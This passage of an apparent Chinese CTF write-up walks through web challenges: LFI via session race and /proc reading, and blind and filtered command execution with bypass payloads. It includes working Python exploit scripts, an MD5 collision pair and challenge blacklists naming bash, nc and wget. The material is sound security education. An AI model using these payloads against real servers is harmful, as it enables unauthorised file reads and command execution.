class="hljs-string">&#x27;a.txt&#x27;</span>, content)<br>            &#125;,<br>        )<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;上传文件----&quot;</span>)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">LFI</span>(<span class="hljs-params">session</span>):</span><br>    params = &#123;<br>        <span class="hljs-string">&quot;file&quot;</span>:<span class="hljs-string">&quot;/tmp/sess_&quot;</span> + sess_id<br>    &#125;<br>    <span class="hljs-comment">#with open(&quot;res.html&quot;,&quot;w&quot;) as fout:</span><br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        r = session.get(url=url,params=params)<br>        check = <span class="hljs-string">&quot;c4ca4238a0b923820dcc509a6f75849b&quot;</span><br>        <span class="hljs-keyword">if</span> check <span class="hljs-keyword">in</span> r.text:<br>            <span class="hljs-comment">#fout.write(r.text)</span><br>            <span class="hljs-keyword">break</span><br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;LFI读取---&quot;</span>)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">vuln</span>(<span class="hljs-params">session</span>):</span><br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        r = session.get(url + <span class="hljs-string">&quot;1.php&quot;</span>)<br>        <span class="hljs-keyword">if</span> r.status_code == <span class="hljs-number">200</span>:<br>            <span class="hljs-comment">#print(&quot;get_vuln&quot;)</span><br>            <span class="hljs-keyword">break</span><br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;获取vuln---&quot;</span>)      <br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    <span class="hljs-keyword">with</span> requests.session() <span class="hljs-keyword">as</span> session:<br>        t1 = Thread(target=upload, args=(session,))<br>        t2 = Thread(target=LFI,args=(session,))<br>        t3 = Thread(target=vuln,args=(session,))<br>        t1.start()<br>        t2.start()<br>        t3.start()<br></code></pre></td></tr></table></figure><h3 id="sdctf-2022curl-read-and-uplfi读取proc">2、SDCTF 2022—cURL Read and UP（LFI读取/proc）</h3><p>这道题发现漏洞点倒不是非常难，但是最开始确实是不知道flag在哪里。</p><p>进去之后输入url，http://www.baidu.com</p><p>跳转到某个页面，研究URL，发现read之后的内容似乎为base64编码，解码后发现其实就是JSON</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">http:<span class="hljs-comment">//43.143.7.127:28318/read/eyJ1cmwiOiJmaWxlOi8vL3Byb2MvMTgvZW52aXJvbiJ9</span><br></code></pre></td></tr></table></figure><p>于是直接构造脚本读取文件了</p><p>这里补充一下/proc的相关知识，Linux中"一切皆文件"，因此可以通过/proc目录下的内容读取进程相关的信息</p><p>首先通过读取<code>/proc/self/status</code>，读取到父进程的pid，也就是web服务进程</p><p>再通过<code>/proc/&lt;pid&gt;/environ</code>读取到当前进程的环境变量配置</p><p>只能说，还是不太熟悉flag可能隐藏的地方。</p><p>exp如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">from</span> bs4 <span class="hljs-keyword">import</span> BeautifulSoup<br><br><span class="hljs-keyword">import</span> re<br><br>pattern = <span class="hljs-string">r&#x27;&lt;div id=&quot;readability-page-1&quot; class=&quot;page&quot;&gt;(.+?)&lt;/div&gt;&#x27;</span><br><br><br>data = <span class="hljs-string">&#x27;&#123;&quot;url&quot;:&quot;file:///proc/18/environ&quot;&#125;&#x27;</span><br><span class="hljs-comment">#&#x27;&#123;&quot;url&quot;:&quot;file:///proc/self/status&quot;&#125;&#x27;</span><br><br>url = <span class="hljs-string">&quot;http://43.143.7.127:28318/read/&quot;</span><br><br>r = requests.get(url = url + base64.b64encode(data.encode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)).decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>))<br><br><span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;res.html&quot;</span>,<span class="hljs-string">&quot;wb&quot;</span>).write(r.content)<br><br>target = re.findall(pattern, r.text)<br><br><span class="hljs-built_in">print</span>(target)<br></code></pre></td></tr></table></figure><h2 id="rce">2、RCE</h2><h3 id="swpufinalrce无回显rce">1、SWPU—finalrce（无回显rce）</h3><p>无回显RCE的方法常见的思路有：</p><ul><li>DNS外带</li><li>反弹shell</li></ul><p>每种方法都有很多的trick，比如反弹shell就有非常多的方法，后续可能出一篇反弹shell的总结。</p><p>先看这道题：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>highlight_file(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;url&#x27;</span>]))<br>&#123;<br>    <span class="hljs-variable">$url</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;url&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">&#x27;/bash|nc|wget|ping|ls|cat|more|less|phpinfo|base64|echo|php|python|mv|cp|la|\-|\*|\&quot;|\&gt;|\&lt;|\%|\$/i&#x27;</span>,<span class="hljs-variable">$url</span>))<br>    &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Sorry,you can&#x27;t use this.&quot;</span>;<br>    &#125;<br>    <span class="hljs-keyword">else</span><br>    &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Can you see anything?&quot;</span>;<br>        exec(<span class="hljs-variable">$url</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>看这主要的过滤对象，就是针对反弹shell的。</p><p>先试试能不能rce</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs http">?url=sleep%205<br></code></pre></td></tr></table></figure><p>能够看到果然出现了5s的延迟，那接下来选择外带，我这里用的curl，打的是自己的服务器，ceye.io有的时候感觉没有那么好用。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">dir / | sed s/[[:space:]]/xx/g | tr &#x27;\n&#x27; &#x27;*&#x27;<br><span class="hljs-meta">#</span><span class="bash"> 把空格和tab替换成x，换行替换成</span><br>dir / | tr &#x27; &#x27; &#x27;x&#x27; |tr &#x27;\t&#x27; &#x27;x&#x27;|tr &#x27;\n&#x27; &#x27;,&#x27;<br></code></pre></td></tr></table></figure><p>这种方法的麻烦点就在于要构造合适的payload，也没有办法一梭子进去轻松rce，实际到那道题中构造payload也是要各种绕过（可以参考我之前那篇博客</p><p>补充：这题后来发现开了写权限，所以其实直接</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">?url=tac /flllll\aaaaaaggggggg | tee 1.txt<br></code></pre></td></tr></table></figure><h3 id="广东强网pokemenunicode过滤od命令">2、21广东强网——Pokemen（unicode过滤/od命令）</h3><p>先来看这道题的代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>error_reporting(<span class="hljs-number">0</span>);<br>highlight_file(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-variable">$dir</span> = <span class="hljs-string">&#x27;sandbox/&#x27;</span> . md5(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REMOTE_ADDR&#x27;</span>]) . <span class="hljs-string">&#x27;/&#x27;</span>;<br><br><span class="hljs-keyword">if</span>(!file_exists(<span class="hljs-variable">$dir</span>))&#123;<br>    mkdir(<span class="hljs-variable">$dir</span>);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">DefenderBonus</span>(<span class="hljs-params"><span class="hljs-variable">$Pokemon</span></span>)</span>&#123;<br>    <span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">&quot;/&#x27;| |_|\\$|;|l|s|flag|a|t|m|r|e|j|k|n|w|i|\\\\|p|h|u|v|\\+|\\^|\`|\~|\||\&quot;|\&lt;|\&gt;|\=|&#123;|&#125;|\!|\&amp;|\*|\?|\(|\)/i&quot;</span>,<span class="hljs-variable">$Pokemon</span>))&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;catch broken Pokemon! mew-_-two&#x27;</span>);<br>    &#125;<br>    <span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$Pokemon</span>;<br>    &#125;<br><br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">ghostpokemon</span>(<span class="hljs-params"><span class="hljs-variable">$Pokemon</span></span>)</span>&#123;<br>    <span class="hljs-keyword">if</span>(is_array(<span class="hljs-variable">$Pokemon</span>))&#123;<br>        <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$Pokemon</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$key</span> =&gt; <span class="hljs-variable">$pks</span>) &#123;<br>            <span class="hljs-variable">$Pokemon</span>[<span class="hljs-variable">$key</span>] = DefenderBonus(<span class="hljs-variable">$pks</span>);<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-variable">$Pokemon</span> = DefenderBonus(<span class="hljs-variable">$Pokemon</span>);<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">switch</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;myfavorite&#x27;</span>] ?? <span class="hljs-string">&quot;&quot;</span>)&#123;<br>    <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;picacu!&#x27;</span>:<br>        <span class="hljs-keyword">echo</span> md5(<span class="hljs-string">&#x27;picacu!&#x27;</span>).md5(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REMOTE_ADDR&#x27;</span>]);<br>        <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;bulbasaur!&#x27;</span>:<br>        <span class="hljs-keyword">echo</span> md5(<span class="hljs-string">&#x27;miaowa!&#x27;</span>).md5(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REMOTE_ADDR&#x27;</span>]);<br>        <span class="hljs-variable">$level</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;levelup&quot;</span>] ?? <span class="hljs-string">&quot;&quot;</span>;<br>    <span class="hljs-keyword">if</span> ((!preg_match(<span class="hljs-string">&#x27;/lv100/i&#x27;</span>,<span class="hljs-variable">$level</span>)) &amp;&amp; (preg_match(<span class="hljs-string">&#x27;/lv100/i&#x27;</span>,escapeshellarg(<span class="hljs-variable">$level</span>))))&#123;<br>            <span class="hljs-keyword">echo</span> file_get_contents(<span class="hljs-string">&#x27;./hint.php&#x27;</span>);<br>        &#125;<br>        <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;squirtle&#x27;</span>:<br>        <span class="hljs-keyword">echo</span> md5(<span class="hljs-string">&#x27;jienijieni!&#x27;</span>).md5(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REMOTE_ADDR&#x27;</span>]);<br>        <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;mewtwo&#x27;</span>:<br>        <span class="hljs-variable">$dream</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;dream&quot;</span>] ?? <span class="hljs-string">&quot;&quot;</span>;<br>        <span class="hljs-keyword">if</span>(strlen(<span class="hljs-variable">$dream</span>)&gt;=<span class="hljs-number">20</span>)&#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;So Big Pokenmon!&quot;</span>);<br>        &#125;<br>        ghostpokemon(<span class="hljs-variable">$dream</span>);<br>        <span class="hljs-keyword">echo</span> shell_exec(<span class="hljs-variable">$dream</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>首先一眼看去就是拿hint，也就是要创造字符串，使之被<code>escapeshellarg</code>处理之后存在<code>lv100</code>的字串。</p><p>这里我们可以利用unicode字符会被过滤的效果来实现，我们可以发现在<code>%80</code>之后的unicode字符会被该函数自动过滤掉，类似的处理在sql注入中也有（输入<code>%c2</code>这种utf-8中不存在的字符，也会被过滤）。</p><p><img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0013/image-20220816223126427.png" alt="image-20220816223126427" style="zoom:50%;" /></p><p>得到hint之后，显然就是构造一些巧妙的命令，直接去读取<code>/FLAG</code>文件。</p><p>首先要考虑读取文件，常见的读取方式显然不行，这里可以考虑使用<code>od</code>命令，空格的过滤利用<code>%09</code>代替，部分字符可以利用正则匹配实现，最后的命令如下：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">od%</span><span class="bash">09-c%09/F[B-Z][@-C]G</span><br></code></pre></td></tr></table></figure><p>成功读取到了flag。</p><h3 id="安询杯ez_web">3、安询杯——ez_web</h3><p>打开环境之后，观察url</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">http</span>://<span class="hljs-number">1.14.71.254:28200</span>/index.php?img=TXpVek<span class="hljs-number">5</span>UTTFNbVUzTURabE<span class="hljs-number">5</span>qYz<span class="hljs-number">0</span>&amp;cmd=<br></code></pre></td></tr></table></figure><p>尝试解码img参数，发现这里有着文件包含的洞</p><p><img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0013/image-20220819203318445.png" alt="image-20220819203318445" style="zoom:50%;" /></p><p>直接尝试php伪协议，发现无果，直接尝试index.php（猜测会将文件内容先用base64编码）</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>error_reporting(E_ALL || ~ E_NOTICE);<br>header(<span class="hljs-string">&#x27;content-type:text/html;charset=utf-8&#x27;</span>);<br><span class="hljs-variable">$cmd</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>];<br><span class="hljs-keyword">if</span> (!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;img&#x27;</span>]) || !<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>])) <br>    header(<span class="hljs-string">&#x27;Refresh:0;url=./index.php?img=TXpVek5UTTFNbVUzTURabE5qYz0&amp;cmd=&#x27;</span>);<br><span class="hljs-variable">$file</span> = hex2bin(base64_decode(base64_decode(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;img&#x27;</span>])));<br><br><span class="hljs-variable">$file</span> = preg_replace(<span class="hljs-string">&quot;/[^a-zA-Z0-9.]+/&quot;</span>, <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$file</span>);<br><span class="hljs-keyword">if</span> (preg_match(<span class="hljs-string">&quot;/flag/i&quot;</span>, <span class="hljs-variable">$file</span>)) &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;img src =&quot;./ctf3.jpeg&quot;&gt;&#x27;</span>;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;xixi～ no flag&quot;</span>);<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-variable">$txt</span> = base64_encode(file_get_contents(<span class="hljs-variable">$file</span>));<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;img src=&#x27;data:image/gif;base64,&quot;</span> . <span class="hljs-variable">$txt</span> . <span class="hljs-string">&quot;&#x27;&gt;&lt;/img&gt;&quot;</span>;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br>&#125;<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$cmd</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br><span class="hljs-keyword">if</span> (preg_match(<span class="hljs-string">&quot;/ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\&#x27;|\&quot;|\`|;|,|\*|\?|\\|\\\\|\n|\t|\r|\xA0|\&#123;|\&#125;|\(|\)|\&amp;[^\d]|@|\||\\$|\[|\]|&#123;|&#125;|\(|\)|-|&lt;|&gt;/i&quot;</span>, <span class="hljs-variable">$cmd</span>)) &#123;<br>    <span class="hljs-keyword">echo</span>(<span class="hljs-string">&quot;forbid ~&quot;</span>);<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-keyword">if</span> ((<span class="hljs-keyword">string</span>)<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;a&#x27;</span>] !== (<span class="hljs-keyword">string</span>)<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;b&#x27;</span>] &amp;&amp; md5(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;a&#x27;</span>]) === md5(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;b&#x27;</span>])) &#123;<br>        <span class="hljs-keyword">echo</span> `<span class="hljs-variable">$cmd</span>`;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">echo</span> (<span class="hljs-string">&quot;md5 is funny ~&quot;</span>);<br>    &#125;<br>&#125;<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>果然拿到index.php的编码，原来是被正则过滤了。</p><p>md5的绕过非常简单，主要在于构造rce命令</p><p>首先使用</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">dir /<br></code></pre></td></tr></table></figure><p>发现flag在根目录下，接下来就是读取文件，从网上学到可以使用</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">sort /flag<br></code></pre></td></tr></table></figure><p>不过这里介绍另外一个php的点，先给一个demo代码。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$tar</span> = <span class="hljs-string">&quot;abc(\\&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$tar</span>.<span class="hljs-string">&quot;\n&lt;br&gt;\n&quot;</span>;<br><span class="hljs-variable">$tar1</span> = preg_replace(<span class="hljs-string">&quot;/\\|\\\\|\(|b|a|c/i&quot;</span>,<span class="hljs-string">&#x27;&#x27;</span>,<span class="hljs-variable">$tar</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$tar1</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;\n&lt;br&gt;\n&quot;</span>;<br><span class="hljs-variable">$tar1</span> = preg_replace(<span class="hljs-string">&quot;/\\\\/i&quot;</span>,<span class="hljs-string">&#x27;&#x27;</span>,<span class="hljs-variable">$tar</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$tar1</span>;<br><span class="hljs-meta">?&gt;</span><br><span class="hljs-comment">/*********</span><br><span class="hljs-comment">before : &quot;abc\&quot;</span><br><span class="hljs-comment">replace: &quot;\&quot;</span><br><span class="hljs-comment">replace: &quot;\&quot;</span><br><span class="hljs-comment">***********/</span><br></code></pre></td></tr></table></figure><p>非常有意思的点在于，当正则中存在<code>\\</code>这样的语句时，会无效化后面的一个匹配项，当你要过滤<code>\</code>，你需要使用<code>\\\\</code>来实现，由此观察源代码，你会发现其实<code>\</code>并没有被过滤。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">c\at /flag<br></code></pre></td></tr></table></figure><p>exp如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">import</span> hashlib<br><span class="hljs-keyword">from</span> urllib.parse <span class="hljs-keyword">import</span> unquote,quote<br><span class="hljs-keyword">import</span> re<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">toAsciiHex</span>(<span class="hljs-params">s</span>):</span><br>    res = <span class="hljs-string">&quot;&quot;</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> s:<br>        res += <span class="hljs-built_in">hex</span>(<span class="hljs-built_in">ord</span>(i)).replace(<span class="hljs-string">&#x27;0x&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>)<br>    <span class="hljs-keyword">return</span> res<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    url = <span class="hljs-string">&quot;http://1.14.71.254:28200&quot;</span><br>    path = <span class="hljs-string">&quot;/index.php&quot;</span><br><br>    <span class="hljs-comment"># url = &quot;http://127.0.0.1&quot;</span><br>    <span class="hljs-comment"># path = &quot;/1.php&quot;</span><br><br>    filename = <span class="hljs-string">&quot;index.php&quot;</span><br>    cmd = <span class="hljs-string">&quot;c\\at /flag&quot;</span><br>    params = &#123;<br>        <span class="hljs-string">&quot;img&quot;</span>:base64.b64encode(<br>                base64.b64encode(<br>                    toAsciiHex(filename).encode(<span class="hljs-string">&#x27;utf-8&#x27;</span>))),<br>        <span class="hljs-string">&quot;cmd&quot;</span>:cmd,<br>    &#125;<br><br>    pattern = re.<span class="hljs-built_in">compile</span>(<span class="hljs-string">&quot;ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\&#x27;|\&quot;|\`|;|,|\*|\?|\\|\\\\|\n|\t|\r|\xA0|\&#123;|\&#125;|\(|\)|\&amp;[^\d]|@|\||\\$|\[|\]|&#123;|&#125;|\(|\)|-|&lt;|&gt;&quot;</span>)<br>    select = pattern.findall(cmd)<br>    <span class="hljs-keyword">if</span>(<span class="hljs-literal">False</span>):<br>    <span class="hljs-comment">#if(select != []):</span><br>        <span class="hljs-built_in">print</span>(select)<br>    <span class="hljs-keyword">else</span>:<br>        proxies = &#123;<br>            <span class="hljs-string">&quot;http&quot;</span>:<span class="hljs-string">&quot;127.0.0.1:8080&quot;</span><br>        &#125;<br><br>        <span class="hljs-comment"># md5</span><br>        a = <span class="hljs-string">r&quot;1%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%AA%9FNC%A6%B0%3Ca9%A6%D9%F52j%E5%07%F7%13%E1%ADn%3D%8A%B7%5D%D27%B6%EE+A4%B5%0D%BF%02%3A%0B%F0%F2K%1A9%C3%1E%96%B7%14%92%9B%88Oh%93%3E%EBb%3C%CB%9B%CB%029a%5D%7B%E1%CA%D2%99%0E%FBs%FD%DFW%A5%EAJ%0A%B8%7EUQ%FBe%16%26%D3Zv7%ECF%DE%E7%EE%25%1EX%F4%98%D8%12%CA.EO%B8%CCU%EEk%10%18%0Ej%9B%C1%C4%0BZ%10%05%3D%29%C1%5E&quot;</span><br>        b = <span class="hljs-string">r&quot;1%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%AA%9FNC%A6%B0%3Ca9%A6%D9%F52j%E5%07%F7%13%E1-n%3D%8A%B7%5D%D27%B6%EE+A4%B5%0D%BF%02%3A%0B%F0%F2K%1A9%C3%1E%16%B8%14%92%9B%88Oh%93%3E%EBb%3C%CB%1B%CB%029a%5D%7B%E1%CA%D2%99%0E%FBs%FD%DFW%A5%EAJ%0A%B8%7EU%D1%FBe%16%26%D3Zv7%ECF%DE%E7%EE%25%1EX%F4%98%D8%12%CA.EO%B8LU%EEk%10%18%0Ej%9B%C1%C4%0BZ%10%85%3D%29%C1%5E&quot;</span><br><br>        headers = &#123;<br>            <span class="hljs-string">&quot;Content-Type&quot;</span>:<span class="hljs-string">&quot;application/x-www-form-urlencoded&quot;</span><br>        &#125;<br><br>        data = <span class="hljs-string">&quot;a=&quot;</span>+a+<span class="hljs-string">&quot;&amp;b=&quot;</span>+b<br>        r = requests.post(url = url + path,params=params,proxies=proxies,headers=headers,data=data)<br><br>        <span class="hljs-built_in">print</span>(r.text)<br></code></pre></td></tr></table></figure><h3 id="第五空间png转换器ruby">4、第五空间—PNG转换器（Ruby）</h3><p>这道题考察的是Ruby的rce</p><p>对于Ruby内置的open函数，如果传入的参数开头为管道运算符，则可以实现rce。</p><p>首先查看源代码：</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span 